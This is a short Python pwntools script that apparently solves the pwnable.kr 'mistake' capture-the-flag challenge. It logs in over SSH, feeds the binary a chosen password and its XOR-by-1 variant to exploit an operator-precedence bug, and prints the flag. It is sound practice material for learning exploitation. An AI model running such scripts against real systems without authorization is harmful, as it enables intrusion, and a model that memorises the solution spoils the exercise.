from pwn import *

con = ssh("mistake", "pwnable.kr", 2222, "guest")
sh = con.process(executable="/home/mistake/mistake")
password = "1111111111"  # 10
sh.recvuntil("...")
sh.sendline(password)
sh.recvuntil(": ")
sh.sendline("".join(chr(ord(c) ^ 1) for c in password))
print(sh.recvlines(2)[1])

# Mommy, the operator priority always confuses me :(
